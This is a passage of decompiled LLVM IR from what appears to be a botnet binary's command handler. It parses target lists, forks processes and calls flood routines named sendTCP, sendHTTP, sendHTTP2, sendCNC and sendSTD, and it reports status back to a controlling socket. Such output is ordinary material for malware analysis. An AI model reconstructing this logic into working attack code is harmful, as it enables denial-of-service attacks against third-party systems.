  %v1_10e38 = call i32 @atol(i32 %v2_10e30)
  %v5_10e44 = icmp sgt i32 %v1_10e38, 0
  br i1 %v5_10e44, label %dec_label_pc_10e60, label %dec_label_pc_10e48

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10e28, %dec_label_pc_10dfc, %dec_label_pc_10dd0, %dec_label_pc_10db0, %dec_label_pc_10d90, %dec_label_pc_10d70, %dec_label_pc_10d64
  %v2_10e4c = load i32, i32* @global_var_26864.54, align 4
  %v3_10e58 = call i32 @sockprintf(i32 %v2_10e4c, i32 ptrtoint ([186 x i8]* @global_var_1ca34.758 to i32))
  br label %dec_label_pc_11858

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e1c, %dec_label_pc_10e28
  %v1_10e64 = add i32 %tmp, 4
  %v1_10e68 = inttoptr i32 %v1_10e64 to i32*
  %v2_10e68 = load i32, i32* %v1_10e68, align 4
  %v2_10e78 = load i32, i32* %v1_10d98, align 4
  store i32 %v2_10e78, i32* @r0, align 4
  %v1_10e80 = call i32 @atol(i32 %v2_10e78)
  %v2_10e94 = load i32, i32* %v1_10d78, align 4
  store i32 %v2_10e94, i32* @r0, align 4
  %v1_10e9c = call i32 @atol(i32 %v2_10e94)
  %v2_10eb0 = load i32, i32* %v1_10db8, align 4
  store i32 %v2_10eb0, i32* @r0, align 4
  %v1_10eb8 = call i32 @atol(i32 %v2_10eb0)
  %v1_10ec8 = add i32 %tmp, 20
  %v1_10ecc = inttoptr i32 %v1_10ec8 to i32*
  %v2_10ecc = load i32, i32* %v1_10ecc, align 4
  br i1 %v7_10e20, label %dec_label_pc_10ee0, label %dec_label_pc_10efc

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10e60
  %v1_10ee4 = add i32 %tmp, 28
  %v1_10ee8 = inttoptr i32 %v1_10ee4 to i32*
  %v2_10ee8 = load i32, i32* %v1_10ee8, align 4
  store i32 %v2_10ee8, i32* @r0, align 4
  %v1_10ef0 = call i32 @atol(i32 %v2_10ee8)
  br label %dec_label_pc_10f04

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10e60
  br label %dec_label_pc_10f04

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10ee0, %dec_label_pc_10efc
  %storemerge7 = phi i32 [ 10, %dec_label_pc_10efc ], [ %v1_10ef0, %dec_label_pc_10ee0 ]
  br i1 %v7_10df8, label %dec_label_pc_10f34, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f04
  %v1_10f1c = add i32 %tmp, 24
  %v1_10f20 = inttoptr i32 %v1_10f1c to i32*
  %v2_10f20 = load i32, i32* %v1_10f20, align 4
  store i32 %v2_10f20, i32* @r0, align 4
  %v1_10f28 = call i32 @atol(i32 %v2_10f20)
  br label %dec_label_pc_10f3c

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f04
  br label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10f34
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10f34 ], [ %v1_10f28, %dec_label_pc_10f18 ]
  %v2_10f50 = call i32 @__GI_strchr(i32 %v2_10e68, i32 44)
  %v2_10f58 = icmp eq i32 %v2_10f50, 0
  br i1 %v2_10f58, label %dec_label_pc_10fe4, label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f3c
  store i32 %v2_10e68, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_10f6c = call i32 @__GI_strtok(i32 %v2_10e68, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_10fd838 = icmp eq i32 %v2_10f6c, 0
  br i1 %v2_10fd838, label %dec_label_pc_11028, label %dec_label_pc_10f7c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10fc0
  %storemerge1939 = phi i32 [ %v2_10fc8, %dec_label_pc_10fc0 ], [ %v2_10f6c, %dec_label_pc_10f60 ]
  %v0_10f7c = call i32 @listFork()
  %v2_10f84 = icmp eq i32 %v0_10f7c, 0
  br i1 %v2_10f84, label %dec_label_pc_10f8c, label %dec_label_pc_10fc0

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f7c
  %v7_10fb4 = call i32 @sendTCP(i32 %storemerge1939, i32 %v1_10e80, i32 %v1_10e9c, i32 %v1_10eb8, i32 %v2_10ecc, i32 %storemerge6, i32 %storemerge7)
  %v1_10fbc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10f7c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_10fc8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_10fd8 = icmp eq i32 %v2_10fc8, 0
  br i1 %v2_10fd8, label %dec_label_pc_11028, label %dec_label_pc_10f7c

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10f3c
  %v0_10fe4 = call i32 @listFork()
  %v2_10fec = icmp eq i32 %v0_10fe4, 0
  br i1 %v2_10fec, label %dec_label_pc_10ff4, label %dec_label_pc_11028

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_10fe4
  %v7_1101c = call i32 @sendTCP(i32 %v2_10e68, i32 %v1_10e80, i32 %v1_10e9c, i32 %v1_10eb8, i32 %v2_10ecc, i32 %storemerge6, i32 %storemerge7)
  %v1_11024 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11028:                               ; preds = %dec_label_pc_10fc0, %dec_label_pc_10f60, %dec_label_pc_10fe4, %dec_label_pc_10d44
  %v2_1102c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1caf0.760 to i32), i32* @r1, align 4
  %v3_11038 = inttoptr i32 %v2_1102c to i8*
  %v4_11038 = call i32 @__GI_strcoll(i8* %v3_11038, i32 ptrtoint ([5 x i8]* @global_var_1caf0.760 to i32))
  %v2_11040 = icmp eq i32 %v4_11038, 0
  br i1 %v2_11040, label %dec_label_pc_11048, label %dec_label_pc_11230

dec_label_pc_11048:                               ; preds = %dec_label_pc_11028
  %v7_11050 = icmp slt i32 %arg1, 6
  br i1 %v7_11050, label %dec_label_pc_11858, label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %dec_label_pc_11048
  %v1_11058 = add i32 %tmp, 4
  %v1_1105c = inttoptr i32 %v1_11058 to i32*
  %v2_1105c = load i32, i32* %v1_1105c, align 4
  %v2_11068 = call i32 @__GI_strchr(i32 %v2_1105c, i32 44)
  %v2_11070 = icmp eq i32 %v2_11068, 0
  br i1 %v2_11070, label %dec_label_pc_11178, label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %dec_label_pc_11054
  %v2_11080 = load i32, i32* %v1_1105c, align 4
  store i32 %v2_11080, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_1108c = call i32 @__GI_strtok(i32 %v2_11080, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_1116c36 = icmp eq i32 %v2_1108c, 0
  br i1 %v2_1116c36, label %dec_label_pc_11230, label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %dec_label_pc_11078, %dec_label_pc_11154
  %v0_1109c = call i32 @listFork()
  %v2_110a4 = icmp eq i32 %v0_1109c, 0
  br i1 %v2_110a4, label %dec_label_pc_110ac, label %dec_label_pc_11154

dec_label_pc_110ac:                               ; preds = %dec_label_pc_1109c
  %v2_110b4 = load i32, i32* %v1_1105c, align 4
  store i32 %v2_110b4, i32* @r5, align 4
  %v1_110c0 = add i32 %tmp, 8
  %v1_110c4 = inttoptr i32 %v1_110c0 to i32*
  %v2_110c4 = load i32, i32* %v1_110c4, align 4
  store i32 %v2_110c4, i32* @r6, align 4
  %v1_110d0 = add i32 %tmp, 12
  %v1_110d4 = inttoptr i32 %v1_110d0 to i32*
  %v2_110d4 = load i32, i32* %v1_110d4, align 4
  store i32 %v2_110d4, i32* @r0, align 4
  %v1_110dc = call i32 @atol(i32 %v2_110d4)
  %v3_110e8 = urem i32 %v1_110dc, 65536
  store i32 %v3_110e8, i32* @r7, align 4
  %v1_110f4 = add i32 %tmp, 16
  %v1_110f8 = inttoptr i32 %v1_110f4 to i32*
  %v2_110f8 = load i32, i32* %v1_110f8, align 4
  store i32 %v2_110f8, i32* @r8, align 4
  %v1_11104 = add i32 %tmp, 20
  %v1_11108 = inttoptr i32 %v1_11104 to i32*
  %v2_11108 = load i32, i32* %v1_11108, align 4
  store i32 %v2_11108, i32* @r0, align 4
  %v1_11110 = call i32 @atol(i32 %v2_11108)
  store i32 %v1_11110, i32* @r4, align 4
  %v1_1111c = add i32 %tmp, 24
  %v1_11120 = inttoptr i32 %v1_1111c to i32*
  %v2_11120 = load i32, i32* %v1_11120, align 4
  store i32 %v2_11120, i32* @r0, align 4
  %v1_11128 = call i32 @atol(i32 %v2_11120)
  %v0_11130 = load i32, i32* @r4, align 4
  %v0_11138 = load i32, i32* @r5, align 4
  %v0_1113c = load i32, i32* @r6, align 4
  %v0_11140 = load i32, i32* @r7, align 4
  %v0_11144 = load i32, i32* @r8, align 4
  %v6_11148 = trunc i32 %v0_11140 to i8
  %v7_11148 = call i32 @sendHTTP(i32 %v0_11138, i32 %v0_1113c, i8 %v6_11148, i32 %v0_11144, i32 %v0_11130, i32 %v1_11128)
  %v1_11150 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11154:                               ; preds = %dec_label_pc_1109c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_1115c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_1116c = icmp eq i32 %v2_1115c, 0
  br i1 %v2_1116c, label %dec_label_pc_11230, label %dec_label_pc_1109c

dec_label_pc_11178:                               ; preds = %dec_label_pc_11054
  %v0_11178 = call i32 @listFork()
  %v2_11180 = icmp eq i32 %v0_11178, 0
  br i1 %v2_11180, label %dec_label_pc_11188, label %dec_label_pc_11858

dec_label_pc_11188:                               ; preds = %dec_label_pc_11178
  %v2_11190 = load i32, i32* %v1_1105c, align 4
  store i32 %v2_11190, i32* @r5, align 4
  %v1_1119c = add i32 %tmp, 8
  %v1_111a0 = inttoptr i32 %v1_1119c to i32*
  %v2_111a0 = load i32, i32* %v1_111a0, align 4
  store i32 %v2_111a0, i32* @r6, align 4
  %v1_111ac = add i32 %tmp, 12
  %v1_111b0 = inttoptr i32 %v1_111ac to i32*
  %v2_111b0 = load i32, i32* %v1_111b0, align 4
  store i32 %v2_111b0, i32* @r0, align 4
  %v1_111b8 = call i32 @atol(i32 %v2_111b0)
  %v3_111c4 = urem i32 %v1_111b8, 65536
  store i32 %v3_111c4, i32* @r7, align 4
  %v1_111d0 = add i32 %tmp, 16
  %v1_111d4 = inttoptr i32 %v1_111d0 to i32*
  %v2_111d4 = load i32, i32* %v1_111d4, align 4
  store i32 %v2_111d4, i32* @r8, align 4
  %v1_111e0 = add i32 %tmp, 20
  %v1_111e4 = inttoptr i32 %v1_111e0 to i32*
  %v2_111e4 = load i32, i32* %v1_111e4, align 4
  store i32 %v2_111e4, i32* @r0, align 4
  %v1_111ec = call i32 @atol(i32 %v2_111e4)
  store i32 %v1_111ec, i32* @r4, align 4
  %v1_111f8 = add i32 %tmp, 24
  %v1_111fc = inttoptr i32 %v1_111f8 to i32*
  %v2_111fc = load i32, i32* %v1_111fc, align 4
  store i32 %v2_111fc, i32* @r0, align 4
  %v1_11204 = call i32 @atol(i32 %v2_111fc)
  %v0_1120c = load i32, i32* @r4, align 4
  %v0_11214 = load i32, i32* @r5, align 4
  %v0_11218 = load i32, i32* @r6, align 4
  %v0_1121c = load i32, i32* @r7, align 4
  %v0_11220 = load i32, i32* @r8, align 4
  %v6_11224 = trunc i32 %v0_1121c to i8
  %v7_11224 = call i32 @sendHTTP(i32 %v0_11214, i32 %v0_11218, i8 %v6_11224, i32 %v0_11220, i32 %v0_1120c, i32 %v1_11204)
  %v1_1122c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11230:                               ; preds = %dec_label_pc_11154, %dec_label_pc_11078, %dec_label_pc_11028
  %v2_11234 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1caf8.762 to i32), i32* @r1, align 4
  %v3_11240 = inttoptr i32 %v2_11234 to i8*
  %v4_11240 = call i32 @__GI_strcoll(i8* %v3_11240, i32 ptrtoint ([10 x i8]* @global_var_1caf8.762 to i32))
  %v2_11248 = icmp eq i32 %v4_11240, 0
  br i1 %v2_11248, label %dec_label_pc_11250, label %dec_label_pc_11358

dec_label_pc_11250:                               ; preds = %dec_label_pc_11230
  %v7_11258 = icmp slt i32 %arg1, 6
  br i1 %v7_11258, label %dec_label_pc_11858, label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11250
  %v1_11260 = add i32 %tmp, 12
  %v1_11264 = inttoptr i32 %v1_11260 to i32*
  %v2_11264 = load i32, i32* %v1_11264, align 4
  store i32 %v2_11264, i32* @r0, align 4
  %v1_1126c = call i32 @atol(i32 %v2_11264)
  %tmp105 = icmp slt i32 %v1_1126c, 1
  br i1 %tmp105, label %dec_label_pc_11858, label %dec_label_pc_1127c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_1125c
  %v1_11280 = add i32 %tmp, 20
  %v1_11284 = inttoptr i32 %v1_11280 to i32*
  %v2_11284 = load i32, i32* %v1_11284, align 4
  store i32 %v2_11284, i32* @r0, align 4
  %v1_1128c = call i32 @atol(i32 %v2_11284)
  %v5_11298 = icmp sgt i32 %v1_1128c, 0
  br i1 %v5_11298, label %dec_label_pc_112a0, label %dec_label_pc_11858

dec_label_pc_112a0:                               ; preds = %dec_label_pc_1127c
  %v0_112a0 = call i32 @listFork()
  %v2_112a8 = icmp eq i32 %v0_112a0, 0
  br i1 %v2_112a8, label %dec_label_pc_112b0, label %dec_label_pc_11858

dec_label_pc_112b0:                               ; preds = %dec_label_pc_112a0
  %v1_112b4 = add i32 %tmp, 4
  %v1_112b8 = inttoptr i32 %v1_112b4 to i32*
  %v2_112b8 = load i32, i32* %v1_112b8, align 4
  store i32 %v2_112b8, i32* @r5, align 4
  %v1_112c4 = add i32 %tmp, 8
  %v1_112c8 = inttoptr i32 %v1_112c4 to i32*
  %v2_112c8 = load i32, i32* %v1_112c8, align 4
  store i32 %v2_112c8, i32* @r6, align 4
  %v2_112d8 = load i32, i32* %v1_11264, align 4
  store i32 %v2_112d8, i32* @r0, align 4
  %v1_112e0 = call i32 @atol(i32 %v2_112d8)
  %v3_112ec = urem i32 %v1_112e0, 65536
  store i32 %v3_112ec, i32* @r7, align 4
  %v1_112f8 = add i32 %tmp, 16
  %v1_112fc = inttoptr i32 %v1_112f8 to i32*
  %v2_112fc = load i32, i32* %v1_112fc, align 4
  store i32 %v2_112fc, i32* @r8, align 4
  %v2_1130c = load i32, i32* %v1_11284, align 4
  store i32 %v2_1130c, i32* @r0, align 4
  %v1_11314 = call i32 @atol(i32 %v2_1130c)
  store i32 %v1_11314, i32* @r4, align 4
  %v1_11320 = add i32 %tmp, 24
  %v1_11324 = inttoptr i32 %v1_11320 to i32*
  %v2_11324 = load i32, i32* %v1_11324, align 4
  store i32 %v2_11324, i32* @r0, align 4
  %v1_1132c = call i32 @atol(i32 %v2_11324)
  %v0_11334 = load i32, i32* @r4, align 4
  %v0_1133c = load i32, i32* @r5, align 4
  %v0_11340 = load i32, i32* @r6, align 4
  %v0_11344 = load i32, i32* @r7, align 4
  %v0_11348 = load i32, i32* @r8, align 4
  %v6_1134c = trunc i32 %v0_11344 to i8
  %v7_1134c = call i32 @sendHTTP2(i32 %v0_1133c, i32 %v0_11340, i8 %v6_1134c, i32 %v0_11348, i32 %v0_11334, i32 %v1_1132c)
  %v1_11354 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_11230, %dec_label_pc_112b0
  %v2_1135c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cb04.764 to i32), i32* @r1, align 4
  %v3_11368 = inttoptr i32 %v2_1135c to i8*
  %v4_11368 = call i32 @__GI_strcoll(i8* %v3_11368, i32 ptrtoint ([4 x i8]* @global_var_1cb04.764 to i32))
  %v2_11370 = icmp eq i32 %v4_11368, 0
  br i1 %v2_11370, label %dec_label_pc_11378, label %dec_label_pc_114e0

dec_label_pc_11378:                               ; preds = %dec_label_pc_11358
  %v7_11380 = icmp slt i32 %arg1, 4
  br i1 %v7_11380, label %dec_label_pc_113c4, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_11378
  %v1_11388 = add i32 %tmp, 8
  %v1_1138c = inttoptr i32 %v1_11388 to i32*
  %v2_1138c = load i32, i32* %v1_1138c, align 4
  store i32 %v2_1138c, i32* @r0, align 4
  %v1_11394 = call i32 @atol(i32 %v2_1138c)
  %tmp106 = icmp slt i32 %v1_11394, 1
  br i1 %tmp106, label %dec_label_pc_113c4, label %dec_label_pc_113a4

dec_label_pc_113a4:                               ; preds = %dec_label_pc_11384
  %v1_113a8 = add i32 %tmp, 12
  %v1_113ac = inttoptr i32 %v1_113a8 to i32*
  %v2_113ac = load i32, i32* %v1_113ac, align 4
  store i32 %v2_113ac, i32* @r0, align 4
  %v1_113b4 = call i32 @atol(i32 %v2_113ac)
  %v5_113c0 = icmp sgt i32 %v1_113b4, 0
  br i1 %v5_113c0, label %dec_label_pc_113dc, label %dec_label_pc_113c4

dec_label_pc_113c4:                               ; preds = %dec_label_pc_113a4, %dec_label_pc_11384, %dec_label_pc_11378
  %v2_113c8 = load i32, i32* @global_var_26864.54, align 4
  %v3_113d4 = call i32 @sockprintf(i32 %v2_113c8, i32 ptrtoint ([27 x i8]* @global_var_1cb08.766 to i32))
  br label %dec_label_pc_11858

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113a4
  %v1_113e0 = add i32 %tmp, 4
  %v1_113e4 = inttoptr i32 %v1_113e0 to i32*
  %v2_113e4 = load i32, i32* %v1_113e4, align 4
  %v2_113f4 = load i32, i32* %v1_1138c, align 4
  store i32 %v2_113f4, i32* @r0, align 4
  %v1_113fc = call i32 @atol(i32 %v2_113f4)
  %v2_11410 = load i32, i32* %v1_113ac, align 4
  store i32 %v2_11410, i32* @r0, align 4
  %v1_11418 = call i32 @atol(i32 %v2_11410)
  %v2_11430 = call i32 @__GI_strchr(i32 %v2_113e4, i32 44)
  %v2_11438 = icmp eq i32 %v2_11430, 0
  br i1 %v2_11438, label %dec_label_pc_114b8, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_113dc
  store i32 %v2_113e4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_1144c = call i32 @__GI_strtok(i32 %v2_113e4, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_114ac33 = icmp eq i32 %v2_1144c, 0
  br i1 %v2_114ac33, label %dec_label_pc_114e0, label %dec_label_pc_1145c

dec_label_pc_1145c:                               ; preds = %dec_label_pc_11440, %dec_label_pc_11494
  %storemerge1534 = phi i32 [ %v2_1149c, %dec_label_pc_11494 ], [ %v2_1144c, %dec_label_pc_11440 ]
  %v0_1145c = call i32 @listFork()
  %v2_11464 = icmp eq i32 %v0_1145c, 0
  br i1 %v2_11464, label %dec_label_pc_1146c, label %dec_label_pc_11494

dec_label_pc_1146c:                               ; preds = %dec_label_pc_1145c
  %v4_11478 = call i32 @sendCNC(i32 %storemerge1534, i32 %v1_113fc, i32 %v1_11418, i32 0)
  %v2_11480 = load i32, i32* @global_var_26864.54, align 4
  %v1_11488 = call i32 @__libc_close(i32 %v2_11480)
  %v1_11490 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11494:                               ; preds = %dec_label_pc_1145c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_1149c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_114ac = icmp eq i32 %v2_1149c, 0
  br i1 %v2_114ac, label %dec_label_pc_114e0, label %dec_label_pc_1145c

dec_label_pc_114b8:                               ; preds = %dec_label_pc_113dc
  %v0_114b8 = call i32 @listFork()
  %v2_114c0 = icmp eq i32 %v0_114b8, 0
  br i1 %v2_114c0, label %dec_label_pc_114c8, label %dec_label_pc_11858

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114b8
  %v4_114d4 = call i32 @sendCNC(i32 %v2_113e4, i32 %v1_113fc, i32 %v1_11418, i32 0)
  %v1_114dc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_114e0:                               ; preds = %dec_label_pc_11494, %dec_label_pc_11440, %dec_label_pc_11358
  %v2_114e4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cb24.768 to i32), i32* @r1, align 4
  %v3_114f0 = inttoptr i32 %v2_114e4 to i8*
  %v4_114f0 = call i32 @__GI_strcoll(i8* %v3_114f0, i32 ptrtoint ([4 x i8]* @global_var_1cb24.768 to i32))
  %v2_114f8 = icmp eq i32 %v4_114f0, 0
  br i1 %v2_114f8, label %dec_label_pc_11500, label %dec_label_pc_11658

dec_label_pc_11500:                               ; preds = %dec_label_pc_114e0
  %v7_11508 = icmp slt i32 %arg1, 4
  br i1 %v7_11508, label %dec_label_pc_1154c, label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_11500
  %v1_11510 = add i32 %tmp, 8
  %v1_11514 = inttoptr i32 %v1_11510 to i32*
  %v2_11514 = load i32, i32* %v1_11514, align 4
  store i32 %v2_11514, i32* @r0, align 4
  %v1_1151c = call i32 @atol(i32 %v2_11514)
  %tmp107 = icmp slt i32 %v1_1151c, 1
  br i1 %tmp107, label %dec_label_pc_1154c, label %dec_label_pc_1152c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_1150c
  %v1_11530 = add i32 %tmp, 12
  %v1_11534 = inttoptr i32 %v1_11530 to i32*
  %v2_11534 = load i32, i32* %v1_11534, align 4
  store i32 %v2_11534, i32* @r0, align 4
  %v1_1153c = call i32 @atol(i32 %v2_11534)
  %v5_11548 = icmp sgt i32 %v1_1153c, 0
  br i1 %v5_11548, label %dec_label_pc_11564, label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %dec_label_pc_1152c, %dec_label_pc_1150c, %dec_label_pc_11500
  %v2_11550 = load i32, i32* @global_var_26864.54, align 4
  %v3_1155c = call i32 @sockprintf(i32 %v2_11550, i32 ptrtoint ([27 x i8]* @global_var_1cb28.770 to i32))
  br label %dec_label_pc_11858

dec_label_pc_11564:                               ; preds = %dec_label_pc_1152c
  %v1_11568 = add i32 %tmp, 4
  %v1_1156c = inttoptr i32 %v1_11568 to i32*
  %v2_1156c = load i32, i32* %v1_1156c, align 4
  %v2_1157c = load i32, i32* %v1_11514, align 4
  store i32 %v2_1157c, i32* @r0, align 4
  %v1_11584 = call i32 @atol(i32 %v2_1157c)
  %v2_11598 = load i32, i32* %v1_11534, align 4
  store i32 %v2_11598, i32* @r0, align 4
  %v1_115a0 = call i32 @atol(i32 %v2_11598)
  %v2_115b8 = call i32 @__GI_strchr(i32 %v2_1156c, i32 44)
  %v2_115c0 = icmp eq i32 %v2_115b8, 0
  br i1 %v2_115c0, label %dec_label_pc_11630, label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_11564
  store i32 %v2_1156c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_115d4 = call i32 @__GI_strtok(i32 %v2_1156c, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_1162430 = icmp eq i32 %v2_115d4, 0
  br i1 %v2_1162430, label %dec_label_pc_11658, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115c8, %dec_label_pc_1160c
  %storemerge1331 = phi i32 [ %v2_11614, %dec_label_pc_1160c ], [ %v2_115d4, %dec_label_pc_115c8 ]
  %v0_115e4 = call i32 @listFork()
  %v2_115ec = icmp eq i32 %v0_115e4, 0
  br i1 %v2_115ec, label %dec_label_pc_115f4, label %dec_label_pc_1160c

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115e4
  %v4_11600 = call i32 @sendSTD(i32 %storemerge1331, i32 %v1_11584, i32 %v1_115a0, i32 0)
  %v1_11608 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1160c:                               ; preds = %dec_label_pc_115e4
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), i32* @r1, align 4
  %v2_11614 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c5cc.573 to i32))
  %v2_11624 = icmp eq i32 %v2_11614, 0
  br i1 %v2_11624, label %dec_label_pc_11658, label %dec_label_pc_115e4

dec_label_pc_11630:                               ; preds = %dec_label_pc_11564
  %v0_11630 = call i32 @listFork()
  %v2_11638 = icmp eq i32 %v0_11630, 0
  br i1 %v2_11638, label %dec_label_pc_11640, label %dec_label_pc_11858

dec_label_pc_11640:                               ; preds = %dec_label_pc_11630
  %v4_1164c = call i32 @sendSTD(i32 %v2_1156c, i32 %v1_11584, i32 %v1_115a0, i32 0)
  %v1_11654 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11658:                               ; preds = %dec_label_pc_1160c, %dec_label_pc_115c8, %dec_label_pc_114e0
  %v2_1165c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1cb44.772 to i32), i32* @r1, align 4
  %v3_11668 = inttoptr i32 %v2_1165c to i8*
  %v4_11668 = call i32 @__GI_strcoll(i8* %v3_11668, i32 ptrtoint ([9 x i8]* @global_var_1cb44.772 to i32))
  %v2_11670 = icmp eq i32 %v4_11668, 0
  br i1 %v2_11670, label %dec_label_pc_11678, label %dec_label_pc_11830

dec_label_pc_11678:                               ; preds = %dec_label_pc_11658
  br label %dec_label_pc_117a0

dec_label_pc_11710:                               ; preds = %dec_label_pc_117a0, %dec_label_pc_117d4
  %v3_11714 = mul i32 %storemerge11, 4
  %v2_11720 = load i32, i32* @global_var_2caec.75, align 4
  %v2_11724 = add i32 %v2_11720, %v3_11714
  %v1_11728 = inttoptr i32 %v2_11724 to i32*
  %v2_11728 = load i32, i32* %v1_11728, align 4
  %v2_1172c = icmp eq i32 %v2_11728, 0
  br i1 %v2_1172c, label %dec_label_pc_11794, label %dec_label_pc_11734

dec_label_pc_11734:                               ; preds = %dec_label_pc_11710
  %v2_1174c = load i32, i32* %v1_11728, align 4
  store i32 %v2_1174c, i32* @r4, align 4
  %v0_11750 = call i32 @__libc_getpid()
  %v0_11758 = load i32, i32* @r4, align 4
  %v9_11758 = icmp eq i32 %v0_11758, %v0_11750
  br i1 %v9_11758, label %dec_label_pc_11794, label %dec_label_pc_11760

dec_label_pc_11760:                               ; preds = %dec_label_pc_11734
  %v0_11784 = call i32 @kill()
  %v1_1178c = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_11734, %dec_label_pc_11710, %dec_label_pc_11760
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_11710 ], [ %stack_var_-44.1, %dec_label_pc_11734 ], [ %v1_1178c, %dec_label_pc_11760 ]
  %v1_11798 = add i32 %storemerge11, 1
  br label %dec_label_pc_117a0

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11678, %dec_label_pc_11794
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_11678 ], [ %stack_var_-44.0, %dec_label_pc_11794 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_11678 ], [ %v1_11798, %dec_label_pc_11794 ]
  %v5_117b8 = load i32, i32* @global_var_26870.73, align 4
  %v9_117cc = icmp eq i32 %v5_117b8, 0
  br i1 %v9_117cc, label %dec_label_pc_117d4, label %dec_label_pc_11710

dec_label_pc_117d4:                               ; preds = %dec_label_pc_117a0
  %v2_117b8 = load i32, i32* @global_var_2686c.72, align 4
  store i32 0, i32* @r2, align 4
  %tmp117 = icmp ugt i32 %v2_117b8, %storemerge11
  br i1 %tmp117, label %dec_label_pc_11710, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117d4
  %tmp108 = icmp slt i32 %stack_var_-44.1, 1
  %v2_11820 = load i32, i32* @global_var_26864.54, align 4
  br i1 %tmp108, label %dec_label_pc_1181c, label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_117f4
  store i32 %stack_var_-44.1, i32* @r2, align 4
  %v3_11814 = call i32 @sockprintf(i32 %v2_11820, i32 ptrtoint ([11 x i8]* @global_var_1cb50.776 to i32))
  br label %dec_label_pc_11830

dec_label_pc_1181c:                               ; preds = %dec_label_pc_117f4
  %v3_1182c = call i32 @sockprintf(i32 %v2_11820, i32 ptrtoint ([13 x i8]* @global_var_1cb5c.778 to i32))
  br label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_11658, %dec_label_pc_11800, %dec_label_pc_1181c
  %v2_11834 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1cb6c.780 to i32), i32* @r1, align 4
